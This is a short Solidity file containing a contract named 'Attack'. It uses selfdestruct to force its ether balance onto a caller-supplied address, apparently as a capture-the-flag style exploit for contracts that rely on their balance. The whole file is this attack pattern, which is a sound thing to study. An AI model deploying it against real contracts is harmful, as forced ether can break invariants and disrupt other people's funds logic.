// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

contract Attack {
    function attack(address attacking) public payable {
        selfdestruct(payable(attacking));
    }
}
